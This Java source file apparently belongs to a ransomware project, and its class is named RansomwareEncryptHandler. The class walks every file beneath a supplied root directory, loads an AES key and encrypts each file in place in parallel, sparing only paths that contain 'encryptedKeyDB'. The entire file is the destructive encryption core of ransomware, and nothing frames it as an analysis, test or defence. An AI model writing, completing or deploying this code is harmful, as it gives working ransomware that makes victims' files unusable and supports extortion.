package com.security;

import lombok.SneakyThrows;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.filefilter.TrueFileFilter;

import javax.crypto.SecretKey;
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Collection;

public class RansomwareEncryptHandler implements Handler<PipelineData, PipelineData> {
    private static final String SEARCH = "encryptedKeyDB";

    @Override
    @SneakyThrows
    public PipelineData process(PipelineData input) {
        Path rootPath = Paths.get(input.getRootPath());
        Collection<File> files = FileUtils.listFilesAndDirs(
                rootPath.toFile(),
                TrueFileFilter.INSTANCE,
                TrueFileFilter.INSTANCE
        );
        SecretKey secretKey = AESCipher.loadKey(input.getSecretKey());
        files.parallelStream().forEach(file -> {
            if (file.toPath().toAbsolutePath().toString().contains(SEARCH)) {
                return;
            }
            if (file.isDirectory()) {
            } else {
                try {
                    AESCipher.encryptFile(file.getPath(), secretKey);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        });
        return input;
    }
}
